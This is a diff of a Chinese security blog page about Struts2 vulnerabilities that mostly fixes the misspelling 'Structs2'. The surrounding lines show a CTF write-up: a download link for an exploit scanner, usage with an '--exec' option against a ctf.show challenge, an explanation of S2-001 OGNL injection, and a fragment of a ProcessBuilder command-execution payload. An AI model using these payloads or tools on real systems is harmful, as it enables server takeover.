@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>Structs2漏洞 | Sakura501</title>
+  <title>Struts2漏洞 | Sakura501</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/kkk.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -744,7 +744,7 @@
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        Structs2漏洞
+        Struts2漏洞
       </span>
     </div>
     
@@ -800,7 +800,7 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h3 id="structs2漏洞检测工具利用"><a href="#structs2漏洞检测工具利用" class="headerlink" title="structs2漏洞检测工具利用"></a>structs2漏洞检测工具利用</h3><p>这个工具简直现有的洞都通杀，绝绝子！</p>
+        <h3 id="struts2漏洞检测工具利用"><a href="#struts2漏洞检测工具利用" class="headerlink" title="struts2漏洞检测工具利用"></a>struts2漏洞检测工具利用</h3><p>这个工具简直现有的洞都通杀，绝绝子！</p>
 <p>脚本通杀 下载 <code>下载链接：https://pan.baidu.com/s/19yr0tWbG1UU_ULjEan5ttQ 提取码：bn71</code></p>
 <p>用法示例：</p>
 <pre class="line-numbers language-none"><code class="language-none">检测
@@ -808,7 +808,7 @@ python Struts2Scan.py -u http:&#x2F;&#x2F;94c4c47e-4fb3-408c-97d7-56a5094f84a7.c
 利用
 python Struts2Scan.py -u http:&#x2F;&#x2F;94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show&#x2F;S2-001&#x2F;login.action -n S2-001 --exec<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="structs的s2-001漏洞"><a href="#structs的s2-001漏洞" class="headerlink" title="structs的s2-001漏洞"></a>structs的s2-001漏洞</h3><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;224041.html
+<h3 id="struts的s2-001漏洞"><a href="#struts的s2-001漏洞" class="headerlink" title="struts的s2-001漏洞"></a>struts的s2-001漏洞</h3><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;224041.html
 https:&#x2F;&#x2F;blog.csdn.net&#x2F;q20010619&#x2F;article&#x2F;details&#x2F;120729447?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522165130574916782390569415%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id&#x3D;165130574916782390569415&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-120729447.142^v9^pc_search_result_cache,157^v4^control&amp;utm_term&#x3D;ctfshow+web279&amp;spm&#x3D;1018.2226.3001.4187<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用OGNL表达式<code>%&#123;value&#125;</code>进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用<code>%&#123;value&#125;</code>对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。</p>
@@ -889,12 +889,12 @@ password&#x3D;%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[
         
         <div class="tags">
           
-            <a href="/tags/structs2/" class="">
-              structs2
-            </a>
-          
             <a href="/tags/java/" class="">
               java
+            </a>
+          
+            <a href="/tags/struts2/" class="">
+              struts2
             </a>
           
         </div>
@@ -908,7 +908,7 @@ password&#x3D;%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2022/04/30/structs2-lou-dong/" target="_blank" title="Structs2漏洞">http://sakura-501.github.io/2022/04/30/structs2-lou-dong/</a>
+    <a href="/2022/04/30/structs2-lou-dong/" target="_blank" title="Struts2漏洞">http://sakura-501.github.io/2022/04/30/structs2-lou-dong/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
